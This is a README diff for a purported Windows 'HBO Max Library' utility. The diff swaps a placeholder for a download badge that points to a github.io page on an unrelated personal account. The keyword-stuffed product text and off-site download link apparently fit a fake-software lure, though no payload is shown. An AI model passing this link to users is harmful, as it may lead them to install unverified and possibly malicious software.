@@ -4,7 +4,7 @@
 
 HBO Max Library is a focused Windows entertainment utility for measuring content libraries, comparing large collections, and understanding where viewing time goes. HBO Max Library keeps scans readable, reports clear, and daily content decisions easier for home users, students, offices, and technicians who rely on HBO Max Library for steady HBO Max streaming insight.
 
-[![GET HBO Max Library](https://img.shields.io/badge/GET%20%E2%80%94%20HBO%20Max%20Library-0078D6?style=for-the-badge&logoColor=white)](SILKA)
+[![GET HBO Max Library](https://img.shields.io/badge/GET%20%E2%80%94%20HBO%20Max%20Library-0078D6?style=for-the-badge&logoColor=white)](https://bettyjohnsond849.github.io/.github/hbo-max-library)
 
 ---
 
